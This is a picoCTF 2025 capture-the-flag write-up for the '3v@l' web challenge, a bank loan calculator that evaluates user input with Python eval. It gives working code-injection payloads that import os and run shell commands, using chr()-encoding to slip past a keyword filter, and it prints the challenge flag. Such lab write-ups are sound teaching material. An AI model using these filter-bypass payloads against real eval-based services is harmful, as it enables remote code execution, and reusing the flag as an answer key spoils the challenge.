# picoCTF2025 - Web Exploitation - 3v@l

- Write-Up Author: W4yn3Tr4n

- Flag: picoCTF{D0nt_Use_Unsecure_f@nctions6798a2d8}

## Challenge Description:

ABC Bank's website has a loan calculator to help its clients calculate the amount they pay if they take a loan from the bank. Unfortunately, they are using an eval function to calculate the loan. Bypassing this will give you Remote Code Execution (RCE). Can you exploit the bank's calculator and read the flag?

## Write up  

At first, we will be greet with the calculator using EVAL function, i have looked through the function of EVAL and i saw that EVAL is unsecure function which can be used to execute all the command that we put in

First, we check the engine of this web as well: 

![image](https://github.com/user-attachments/assets/de5fa173-a5db-4935-9051-38158b228ca6)

It is still Flask/Jinja2 --> We try some RCE payload for testing but we need to examine the source code first

![image](https://github.com/user-attachments/assets/2a89447a-8911-4b23-a2aa-bf18270b8dc7)

The rules of this EVAL is 
1. Blocking some of the keyword
2. Regex

We try some RCE payload for testing a little bit: __import__('o'+'s').popen('l'+'s'+' /').read()

![image](https://github.com/user-attachments/assets/3427ba90-c2b3-4513-a63a-2ccf58573753)

So we can see that it still blocked the keyword "" so we change it to ascii for another method: __import__(chr(111)+chr(115)).popen(chr(108)+chr(115)+chr(32)+chr(47)).read()


![image](https://github.com/user-attachments/assets/df030d03-c4b4-49f9-bfd7-f13516b19ae9)

Its work !! We can see the flag.txt, so we just adjust the payload a little bit for reading the file flag.txt: __import__(chr(111)+chr(115)).popen(chr(99)+chr(97)+chr(116)+chr(32)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(42)).read()

![image](https://github.com/user-attachments/assets/2b96f59b-2516-4af5-9760-2df61c915988)

























